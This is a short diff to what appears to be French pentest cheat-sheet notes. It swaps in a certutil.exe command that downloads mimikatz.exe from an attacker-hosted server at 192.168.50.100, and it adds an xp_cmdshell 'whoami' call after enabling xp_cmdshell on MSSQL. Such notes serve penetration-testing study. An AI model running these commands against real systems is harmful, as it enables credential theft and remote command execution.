@@ -20,7 +20,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     sudo systemctl start apache2
     sudo cp mimikatz.exe /var/www/html
     ...
-    Invoke-WebRequest -Uri http://192.168.50.100/mimikatz.exe -Outfile ./mimikatz.exe
+    certutil.exe -urlcache -f http://192.168.50.100/mimikatz.exe mimikatz.exe
 
 **Web (Python 3)**
 
@@ -469,6 +469,7 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
     RECONFIGURE;
     EXECUTE sp_configure 'xp_cmdshell', 1;
     RECONFIGURE;
+    EXEC master..xp_cmdshell "whoami"
 
 **MySQL**
 
